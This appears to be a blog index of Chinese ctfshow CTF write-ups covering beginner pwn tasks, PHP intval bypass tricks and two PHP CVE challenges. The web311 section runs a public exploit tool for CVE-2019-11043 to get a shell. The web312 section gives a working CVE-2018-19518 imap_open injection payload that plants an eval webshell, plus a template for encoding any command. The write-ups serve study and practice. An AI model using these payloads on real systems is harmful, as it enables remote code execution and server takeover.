<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn13-19</title>
    <url>/2025/01/19/pwn13-19/</url>
    <content><![CDATA[<h1><em><strong>*pwn13*</strong></em></h1>
<p>如何使用GCC？编译运行后即可获得flag</p>
<p>题目说了gcc</p>
<p>gcc -o flag -flag.c</p>
<p>“-o flag” 表示将编译后的输出文件命名为 “flag”，“-flag.c” 表示要编译的源文件是 “flag.c”。这个指令的作用是使用 gcc 编译器将名为 “flag.c” 的源文件编译成可执行文件，并命名为 “flag”。</p>
<p>之后就编译出了一个flag的文件（无后缀），然后./flag就可以运行得到flag</p>
<h1><em><strong>*pwn14*</strong></em></h1>
<p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p>
<p>Ida</p>
<p><img src="image-20250120034253588.png" alt="image-20250120034253588"></p>
<p>代码的大致逻辑就是读取一个名为&quot;key&quot;的文件，然后根据该文件的内容通过一个while循环再嵌套两个for循环</p>
<p>那一个名字为key的文件怎么搞？内容是什么？</p>
<p>Echo CTFshow &gt; key</p>
<p>Gcc -o flag -flag.c</p>
<p>./flag</p>
<p>拿到flag</p>
<h1><em><strong>*pwn15*</strong></em></h1>
<p>编译汇编代码到可执行文件，即可拿到flag</p>
<p>nasm -f elf64 flag.asm</p>
<p>Gcc -o flag -flag.o</p>
<p>./flag</p>
<p>拿到flag</p>
<h1><em><strong>*pwn16*</strong></em></h1>
<p>使用gcc将其编译为可执行文件</p>
<p>Gcc -o flag -flag.s</p>
<p>./flag</p>
<p>·</p>
<h1><em><strong>*pwn17*</strong></em></h1>
<p>有些命令好像有点不一样？</p>
<p>不要一直等，可能那样永远也等不到flag</p>
<p>Nc一下，四个选项</p>
<p><img src="wps2.jpg" alt="img"></p>
<p>3选项似乎能给出flag，但是要等好久，ida看看要等…114514秒，换算一下约等于31.8小时，ps：傻逼。后面还有system，而且在其他选项当中也有system，而在选项2当中有system，并且可以自行输入system的内容，这应该算是一种思路连接吧，最终得到答案。</p>
<p><img src="wps3.jpg" alt="img"></p>
<p>只有选项2可以用了，</p>
<p>read(0, buf, 0xAuLL);读取输入的9个字符串给buf</p>
<p>strcat(dest, buf);把buf赋值给dest</p>
<p>system(dest);以system输出dest(类似拼接)</p>
<p>那么我们要输入什么呢？而且还要是9个字符串!</p>
<p>原理上，只要不限制长度，cat /ctfshow_flag应该能拿到flag</p>
<p>但是有限制长度，</p>
<p>\1. 根据ctfpwn的考题分析，肯定要拿到shell的，所以，我们system里面要用/bin/sh，就可以</p>
<p>\2. 或者找到其他方法，让输入的字符小于等于9个字符串，用cat /ctf*就可以了</p>
<p>ctfshow{47387d02-8a66-493f-a931-5551b99a4786}</p>
<h1><em><strong>*pwn18*</strong></em></h1>
<p>仔细看看源码，或许有惊喜</p>
<p>假作真时真亦假，真作假时假亦真</p>
<p><img src="wps4.jpg" alt="img"></p>
<p><img src="wps5.jpg" alt="img"></p>
<p><img src="wps6.jpg" alt="img"></p>
<p>ida分析，有fake和real函数，分析得：</p>
<p>fake函数是在文本flag is here 后面跟着一个/ctfshow_flag</p>
<p>Real函数是把文本flag is here 更改为/ctfshow_flag(就是文本，不是指令)</p>
<p>&gt;&gt;</p>
<p>&gt;</p>
<p>综上，应该进行fake函数，并且一定不要运行real函数</p>
<p>Ida分析得，输入9就可以了</p>
<p>ctfshow{39868dcb-b2f7-49ac-83dd-24ea77e44393}</p>
<h1><em><strong>*pwn19*</strong></em></h1>
<p>关闭了输出流，一定是最安全的吗？</p>
<p><img src="wps7.jpg" alt="img"></p>
<p>这是ida看到的</p>
<p><img src="wps8.jpg" alt="img"></p>
<p>nc之后发现已经进入了else进程，应该是别人wp里面的子进程了吧</p>
<p>Fclose(_bss_start)关闭了输出流，就是你无法看到回显，就算你输入了，cat ctfshow_flag也是无法看到内容的</p>
<p>在每个代码后面加上&gt;&amp;0 即可看到回显</p>
<p><img src="wps9.jpg" alt="img"></p>
<p>大致意思应该就是把回显结果覆盖到终端后面或者键盘输入的后面</p>
<p>在之后就可以输入cat ctfshow_flag &gt;&amp;0 即可</p>
<p>最后提一点，我们每次nc进去都是在else里面,我们每次输入一个指令之后得重新nc，因为我们每次输入指令之后子进程就会结束并进入if当中。</p>
<p>ctfshow{478f3d3b-002f-461d-afaa-4ba72d92db9b}</p>
<h1>总结</h1>
<p>1.GCC即GNU 编译器套件（GNU Compiler Collection），将高级编程语言编写的代码转换为可执行机器码或其他目标形式的工具集合，支持多种语言。</p>
<p>2.NASM（Netwide Assembler）是一个基于 x86 架构的汇编语言编译器，用于将汇编语言代码转换为可执行文件或目标文件</p>
<p>3.&gt;&gt;追加，&gt;写入(覆盖)</p>
<p>4.关闭输出流，<code>&gt;&amp;0</code>的作用是将标准输出和标准错误输出都重定向到标准输入所对应的位置或设备</p>
<p><code>&amp;</code>在重定向中用于表示文件描述符。常见的文件描述符有<code>0</code>、<code>1</code>、<code>2</code>，其中<code>0</code>代表标准输入（stdin），<code>1</code>代表标准输出（stdout），<code>2</code>代表标准错误输出（stderr）</p>
<ol start="5">
<li></li>
</ol>
]]></content>
      <tags>
        <tag>ctfshow_pwn_前置基础</tag>
      </tags>
  </entry>
  <entry>
    <title>phpCVE</title>
    <url>/2025/03/05/phpCVE/</url>
    <content><![CDATA[<h1>web311</h1>
<p>不知道是什么东西，跟着wp做就莫名其妙拿到shell了</p>
<p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&amp;from=20065">服务器</a>存在漏洞，可允许攻击者远程执行代码。</p>
<p>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。</p>
<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">location ~ [^<span class="regexp">/]\.php(/</span>|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.<span class="property">php</span>)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param <span class="variable constant_">PATH_INFO</span> $fastcgi_path_info;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   <span class="attr">php</span>:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
<p><strong>影响范围</strong></p>
<p>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p>
<ul>
<li>PHP 7.0 版本</li>
<li>PHP 7.1 版本</li>
<li>PHP 7.2 版本</li>
<li>PHP 7.3 版本</li>
</ul>
<p>做题我们要使用的工具是phuip-fpizdam，基于Go语言的。</p>
<p>先在虚拟机上配置好语言环境和工具。（root）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//更新一下apt</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install --fix-missing</span><br><span class="line">apt --fix-broken install -y</span><br><span class="line"></span><br><span class="line">//安装go</span><br><span class="line">apt install golang</span><br><span class="line"></span><br><span class="line">//测试是否成功</span><br><span class="line">go -version</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//下载工具源码，下不了的话科学上网开全局</span><br><span class="line">git clone https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"></span><br><span class="line">//查看go环境信息</span><br><span class="line">go env</span><br><span class="line"></span><br><span class="line">//目录跳转</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line"></span><br><span class="line">//安装所需</span><br><span class="line">go get -v &amp;&amp; go build</span><br><span class="line"></span><br><span class="line">//如果上条安装所需没反应或者报错，就先执行下面这题（切换代理），然后再安装所需</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Google当中先看看network</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server:nginx/1.18.0 (Ubuntu)</span><br><span class="line"></span><br><span class="line">X-Powered-By:PHP/7.1.33dev</span><br></pre></td></tr></table></figure>
<p>是<code>CVE-2019-11043</code>的特征，并且版本也满足。我们选择用工具一把梭。</p>
<p>工具文件夹里面开终端，换成root，执行：（URL后面要加一个<code>/index.php</code>）</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> run . <span class="string">&quot;https://205bc045-a30a-43e0-8e4a-f50661152144.challenge.ctf.show/index.php&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行过程有一点慢</p>
<p>之后可以直接拿到shell</p>
<p>/index.php?a=ls</p>
<p>/index.php?a=cat fl0gHe1e.txt</p>
<p>此漏洞与二进制相关：</p>
<p><a href="https://xz.aliyun.com/news/6275">https://xz.aliyun.com/news/6275</a></p>
<p><a href="https://xz.aliyun.com/news/6276">https://xz.aliyun.com/news/6276</a></p>
<h1>web312</h1>
<p>CVE-2018-19518</p>
<p>漏洞介绍</p>
<p>IMAP协议（因特网消息访问协议）它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它运行在TCP/IP协议之上，使用的端口是143。在php中调用的是imap_open函数。</p>
<p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。</p>
<p>imap_open(string $mailbox,string $user,string $password)</p>
<p>其中参数mailbox,是用来连接邮箱服务器的。它会调用rsh来连接远程shell而，debian/ubuntu中默认使用ssh来代替rsh，如下图：</p>
<p><img src="image-20250305205348530.png" alt="image-20250305205348530"></p>
<p>又因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，所以攻击者通过注入这个参数，最终将导致命令执行漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oProxyCommand =&quot;tac /flag|tee /tmp/executed&quot;localhost</span><br><span class="line">#其中管道符tee意思是将内容追加到文件并且在屏幕输出</span><br></pre></td></tr></table></figure>
<p>ProxyCommand，连接服务器的这样的一个命令具体说明如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProxyCommand 指定用于连接服务器的命令。命令字符串扩展到行的末尾，并使用用户的shell’ exec’指令执行，以避免延迟的shell进程。 ProxyCommand接受TOKENS 部分中描述的令牌的参数。该命令基本上可以是任何东西，并且应该从其标准输入读取并写入其标准输出。它应该最终连接在某台机器上运行的sshd服务器，或者在sshd -i某处执行。主机密钥管理将使用所连接主机的HostName完成（默认为用户键入的名称）。设置命令以none完全禁用此选项。请注意， CheckHostIP无法与代理命令连接。 该指令与nc及其代理支持结合使用非常有用。例如，以下指令将通过192.0.2.0的HTTP代理连接： ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p</span><br></pre></td></tr></table></figure>
<p>解析命令时还会有问题。要绕过斜杠和空格的转义。用$IFS和\t或者base64编码和相关命令再解码。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;echo hello|tee /tmp/executed&quot;|base64</span><br><span class="line"></span><br><span class="line">ehco ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|base64 -d|bash</span><br></pre></td></tr></table></figure>
<p>影响版本</p>
<p>Ubuntu、Debian、Red Hat、SUSE</p>
<p>PHP 5.6.x &lt; 5.6.39</p>
<p>开始做题。初始界面是邮箱登录，有三个参数可以输入，分别是邮箱、账号、密码。是CVE-2018-19518的特征。</p>
<p>看看network，版本条件都满足。</p>
<p>抓个包看看，三个参数是hostname、username、password，猜测后端PHP语言用了imap_open(string $mailbox,string $user,string $password)语句。满足条件。</p>
<p>直接固定payload打：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#原始payload</span></span><br><span class="line">x+-oProxyCommand=echo	echo <span class="string">&#x27;&lt;?php eval($_POST[1]);&#x27;</span> &gt; /var/www/html/<span class="number">1.</span>php|base64	-d|sh&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#base64+url编码以后</span></span><br><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#模板</span></span><br><span class="line">hostname=x+-oProxyCommand%3decho%09【要执行命令的base64】|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br><span class="line">最终payload：</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br></pre></td></tr></table></figure>
<p>访问/1.php，直接getshell post连接为1</p>
]]></content>
      <tags>
        <tag>phpCVE</tag>
      </tags>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2025/02/05/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1>intval函数，虽然这里是这一个函数，但这里的绕过知识可以类比其他函数</h1>
<p>intval() 函数可以获取变量的「整数值」，常用于<a href="https://so.csdn.net/so/search?q=%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2&amp;spm=1001.2101.3001.7020">强制类型转换</a>。</p>
<p><strong>语法</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span>( <span class="variable">$var</span>, <span class="variable">$base</span> )</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>$var：需要转换成 integer 的「变量」</li>
<li>$base：转换所使用的「进制」</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回值为 integer 类型，可能是 0 或 1 或 其他integer 值。</p>
<ul>
<li>0：失败 或 空array 返回 0</li>
<li>1：非空array 返回 1</li>
<li>其他integer值：成功时 返回 $var 的 integer 值。</li>
</ul>
<p>返回值的「最大值」取决于系统</p>
<ul>
<li>32 位系统（-2147483648 到 2147483647）</li>
<li>64 位系统（-9223372036854775808到9223372036854775807）</li>
</ul>
<h2 id="一、进制自动转换">一、进制自动转换</h2>
<p>第二个参数 $base 允许为空。</p>
<p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p>
<ul>
<li>如果 $var 以 0 开头，就使用 8进制</li>
<li>如果 $var 以0x开头，就使用 16进制</li>
<li>否则，就使用 10进制</li>
</ul>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10的 8进制是12</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">012</span>));</span><br><span class="line"><span class="comment"># 10的 16进制是A</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">0xA</span>));</span><br><span class="line"><span class="comment"># 10的 10进制是10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(10)</span><br><span class="line">int(10)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以使用它的 8进制/16进制来绕过，但通常过滤数字的话全部会过滤，接下来的方法可以尝试</p>
<h2 id="二、转换数组">二、转换数组</h2>
<p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。</p>
<ul>
<li>「空数组」返回 0</li>
<li>「非空数组」返回 1</li>
</ul>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>()));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="number">3</span>,<span class="number">2</span>)));</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(0)</span><br><span class="line">int(1)</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>如果传入的 $var是数组中的某个值时，则当做变量来转换，而不是当做数组类型。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="number">8</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$arr1</span>[<span class="number">0</span>]));</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(8)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>绕过思路：对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。</p>
<h2 id="三、转换小数">三、转换小数</h2>
<p>intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">12</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">1.2</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">1.9</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(12)</span><br><span class="line">int(1)</span><br><span class="line">int(1)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以给它增加小数位来绕过。</p>
<h2 id="四、转换字符串">*四、转换字符串</h2>
<p>intval() 转换字符串类型时，会判断字符串是否以数字开头</p>
<ul>
<li>如果以数字开头，就返回1个或多个连续的数字</li>
<li>如果以字母开头，就返回0</li>
</ul>
<p>单双引号对转换结果没有影响，并且 0 或 0x 开头也只会当做普通字符串处理。</p>
<p><strong>实例</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var_dump(intval(<span class="string">&#x27;12abc&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&quot;12abc&quot;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&#x27;abc123&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&#x27;1a2b3c&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&#x27;0101&#x27;</span>));</span><br><span class="line">var_dump(intval(<span class="string">&quot;0x2b&quot;</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(12)</span><br><span class="line">int(12)</span><br><span class="line">int(0)</span><br><span class="line">int(1)</span><br><span class="line">int(101)</span><br><span class="line">int(0)</span><br></pre></td></tr></table></figure>
<h2 id="五、取反">五、取反~</h2>
<p>intval() 函数支持一些特殊符号的，比如<code>~</code>取反。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~<span class="number">10</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~~<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(-11)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以两次取反来绕过。</p>
<h2 id="六、算数运算符">六、算数运算符</h2>
<p>intval() 函数支持算数运算符，如果传入的 $var参数包含算数运算符，会先运算，再对运算结果进行转换。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">5</span>*<span class="number">5</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">5</span>+<span class="number">5</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">05</span>+<span class="number">5</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(25)</span><br><span class="line">int(10)</span><br><span class="line">int(10)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以使用算数运算符绕过。</p>
<h2 id="七、浮点数精度缺失问题">七、浮点数精度缺失问题</h2>
<p>由于PHP中的浮点数是「弱类型」，存在「精度丢失」的问题，在转换时可能会出现意料之外的情况。</p>
<p>比如下面这个案例，第一个输出34正常，第二个以为会输出58，结果输出了57。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">0.34</span>*<span class="number">100.0</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="number">0.58</span>*<span class="number">100.0</span>));</span><br></pre></td></tr></table></figure>
<p><strong>输出</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int(34)</span><br><span class="line">int(57)</span><br></pre></td></tr></table></figure>
<h2 id="intval-绕过思路">intval()绕过思路</h2>
<p>最后汇总一下intval()函数漏洞的绕过思路：</p>
<p>1）当某个数字被过滤时，可以使用它的 8进制/16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。<br>
2）对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。<br>
3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。<br>
4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。（GET请求的参数会自动拼接单引号）<br>
5）当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。<br>
6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。<br>
原文链接：<a href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">https://blog.csdn.net/wangyuxiang946/article/details/131156104</a></p>
<h1>web89</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1代表true；0代表false</p>
<p>intval();</p>
<p>preg_match()只能处理字符串，如果处理数组会返回false。…看来得补一下各种绕过知识了</p>
<p>intval如果传入数组，会返回1</p>
<p>?num[]=2，后面的数字2可以随便换</p>
<p>ctfshow{a5e284d7-40c2-4e98-8c82-27f479ad717e}</p>
<h1>web90</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>intval处理开头是数字的字符串时，返回值为开头的数</p>
<p>?num=4476a</p>
<p>ctfshow{6a8b00b5-3ae2-4d7f-a9c8-47a502188bee}</p>
<h1>web91</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>/^</code></strong></p>
<ul>
<li>表示匹配字符串的开头。</li>
</ul>
<p><strong><code>php</code></strong></p>
<ul>
<li>表示匹配 “php” 这个具体的字符串。</li>
</ul>
<p><strong><code>$/</code></strong></p>
<ul>
<li>表示匹配字符串的结尾。</li>
</ul>
<p><strong><code>i</code>（修饰符）</strong></p>
<ul>
<li>表示不区分大小写匹配。例如，“PHP”、“Php” 都可以匹配。</li>
</ul>
<p><strong><code>m</code>（修饰符）</strong></p>
<ul>
<li>表示多行匹配模式。也就是说，如果 <code>$a</code> 是多行字符串，每行的开头和结尾都会被匹配，而不仅仅是整个字符串的开头和结尾。</li>
</ul>
<p>?cmd=%0aphp或者?cmd=php%0aphp</p>
<p>ctfshow{b3c727a8-48eb-4f8e-a740-dce79e3b6058}</p>
<h1>web92</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
